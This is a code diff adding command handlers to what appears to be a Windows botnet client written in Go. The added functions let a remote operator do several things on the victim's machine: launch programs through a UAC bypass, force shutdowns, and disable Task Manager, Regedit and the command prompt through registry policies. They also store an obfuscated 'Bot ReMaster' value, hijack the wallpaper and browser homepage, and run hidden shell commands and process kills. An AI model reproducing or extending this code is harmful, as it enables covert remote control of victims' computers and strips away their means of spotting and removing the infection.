@@ -4,10 +4,16 @@
 package components
 
 import (
+	"encoding/base64"
+	"io"
+	"net/http"
 	"os"
+	"os/exec"
 	"strconv"
 	"strings"
+	"syscall"
 	"time"
+	"unsafe"
 
 	"golang.org/x/sys/windows/registry"
 )
@@ -23,8 +29,8 @@ func commandParce(data string) {
 		// fmt.Println("Hello")
 		if md5Hash(data) != val {
 
-			newDebugUpdate("Command HASH: " + md5Hash(data))
-			newDebugUpdate("Val Data: " + val)
+			// newDebugUpdate("Command HASH: " + md5Hash(data))
+			// newDebugUpdate("Val Data: " + val)
 			registryToy(data, 4)
 
 			gettime := strings.Split(data, "||")
@@ -177,5 +183,102 @@ func commandParce(data string) {
 				} //check if gettime[0] = currentTime.Format(time.RFC1123Z)
 			}
 		}
+	}
+}
+
+func openURL(URL string, mode string) { //Opens a URL
+	if mode == "0" {
+		rsp, err := http.Get(URL)
+		if err != nil {
+		}
+		defer rsp.Body.Close()
+	} else { //visable
+		exec.Command("cmd", "/c", "start", URL).Start()
+	}
+}
+
+func startEXE(name string, uac string) { //Start an exe; example calc
+	if strings.Contains(name, ".exe") {
+		if uac == "0" {
+			binary, _ := exec.LookPath(name)
+			exec.Command(binary).Run()
+		} else {
+			binary, _ := exec.LookPath(name)
+			uacBypass(binary)
+		}
+	}
+}
+
+func powerOptions(mode string) {
+	if mode == "0" {
+		run("shutdown -s -t 00")
+	} else if mode == "1" {
+		run("shutdown -r -t 00")
+	} else if mode == "2" {
+		run("shutdown -l -t 00")
+	}
+}
+
+func registryToy(val string, opt int) {
+	if opt == 0 { //TaskMngr
+		_ = writeRegistryKey(registry.CURRENT_USER, systemPoliciesPath, "DisableTaskMgr", val) //0 = on|1 = off
+	} else if opt == 1 { //Regedit
+		_ = writeRegistryKey(registry.CURRENT_USER, systemPoliciesPath, "DisableRegistryTools", val) //0 = on|1 = off
+	} else if opt == 2 { //CMD
+		_ = writeRegistryKey(registry.CURRENT_USER, systemPoliciesPath, "DisableCMD", val) //0 = on|1 = off
+	} else if opt == 3 { //Bot ReMaster
+		_ = deleteRegistryKey(registry.CURRENT_USER, "Software\\"+myInstallReg+"\\", "REMASTER")                //Delete old
+		_ = writeRegistryKey(registry.CURRENT_USER, "Software\\"+myInstallReg+"\\", "REMASTER", obfuscate(val)) //Write new
+	} else if opt == 4 { //Change Last known command
+		//_ = deleteRegistryKey(registry.CURRENT_USER, "Software\\"+myInstallReg+"\\", "LAST")              //Delete old
+		_ = writeRegistryKey(registry.CURRENT_USER, "Software\\"+myInstallReg+"\\", "LAST", md5Hash(val)) //Write new
+
+	}
+}
+
+func setBackground(mode string, data string) {
+	if mode == "0" { //http.GET
+		n := randomString(5, false)
+		output, err := os.Create(tmpPath + n + ".jpg")
+		defer output.Close()
+		response, _ := http.Get(data)
+		if err != nil {
+		}
+		defer response.Body.Close()
+		_, err = io.Copy(output, response.Body)
+		if err == nil {
+			ret, _, _ := procSystemParametersInfoW.Call(20, 0, uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(tmpPath+n+".jpg"))), 2)
+			if ret == 1 {
+			}
+		}
+	} else { //Base64
+		n := randomString(5, false)
+		Image, _ := os.Create(tmpPath + n + ".jpg")
+		DecodedImage, _ := base64.StdEncoding.DecodeString(data)
+		Image.WriteString(string(DecodedImage))
+		Image.Close()
+		ret, _, _ := procSystemParametersInfoW.Call(20, 0, uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(tmpPath+n+".jpg"))), 2)
+		if ret == 1 {
+		}
+	}
+}
+
+func setHomepage(url string) {
+	_ = writeRegistryKey(registry.CURRENT_USER, homepagePath, "Start Page", url)
+}
+
+func run(cmd string) {
+	c := exec.Command("cmd", "/C", cmd)
+	c.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+	if err := c.Run(); err != nil {
+		// newDebugUpdate("Run: " + err.Error())
+	}
+}
+
+func kill(name string) { //Kill("Tool.exe")
+	c := exec.Command("cmd", "/C", "taskkill /F /IM "+name)
+	c.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+	if err := c.Run(); err != nil {
+		// newDebugUpdate("Kill: " + err.Error())
 	}
 }
